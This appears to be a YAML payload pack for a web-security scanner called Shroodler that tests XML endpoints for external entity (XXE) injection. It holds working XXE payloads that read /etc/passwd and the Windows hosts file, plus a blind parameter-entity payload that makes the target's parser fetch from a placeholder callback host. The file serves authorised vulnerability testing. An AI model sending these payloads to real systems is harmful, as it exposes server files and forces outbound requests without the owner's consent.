# XXE (XML External Entity) injection.
#
# These only apply to POST forms/endpoints that accept a raw XML body
# (SOAP, XML-RPC, file-upload-as-XML APIs, etc.) -- the `raw_body: true` /
# `content_type` pack fields tell the tester to send the payload as the
# literal request body with that Content-Type, instead of substituting it
# into each discovered form field like the other packs.
#
# Detection for the two payloads below is signature-based (external entity
# expansion reflected back in the response), the same technique as the
# path-traversal pack. The parameter-entity payload at the bottom is
# genuinely blind (`blind: true`): Shroodler cannot see whether the target's
# XML parser fetched the marker host, only whether *you* saw it hit your own
# server. Pass --oob-host to point it at a real collaborator-style server
# you control, then check that server's logs afterward for the token this
# run printed in --output's oob_probes list. See docs/cli-surface.md.
- id: xxe-linux-passwd
  finding_id: payload-xxe
  raw_body: true
  content_type: application/xml
  severity: critical
  description: XML external entity payload caused local file contents (/etc/passwd) to be reflected in the response
  payload: |
    <?xml version="1.0"?>
    <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    <data>&xxe;</data>
  match:
    any:
      - body_contains: "root:x:0:0"
        new_only: true
- id: xxe-windows-hosts
  finding_id: payload-xxe
  raw_body: true
  content_type: application/xml
  severity: critical
  description: XML external entity payload caused local file contents (Windows hosts file) to be reflected in the response
  payload: |
    <?xml version="1.0"?>
    <!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
    <data>&xxe;</data>
  # "127.0.0.1"/"localhost" alone are common words a generic XML-parser
  # error page could also contain; require the Windows hosts file's own
  # boilerplate comment text too so a real file read is confirmed, not
  # just "the response changed and happens to mention localhost".
  match:
    all:
      - body_contains: "127.0.0.1"
        new_only: true
      - body_contains: "localhost"
        new_only: true
      - body_contains: "for Windows"
        new_only: true
- id: xxe-parameter-entity-oob-marker
  finding_id: payload-xxe-parameter-entity
  raw_body: true
  content_type: application/xml
  blind: true
  severity: medium
  description: >-
    Parameter-entity XXE payload targeting a marker host was sent. This is
    a blind check -- Shroodler cannot observe the callback itself. Pass
    --oob-host to point the marker at a real server you control, then
    check its logs for the token recorded in this run's oob_probes list.
    Without --oob-host this payload is still sent but is unverifiable.
  payload: |
    <?xml version="1.0"?>
    <!DOCTYPE data [<!ENTITY % xxe SYSTEM "http://{{MARKER_HOST}}/xxe">%xxe;]>
    <data>probe</data>
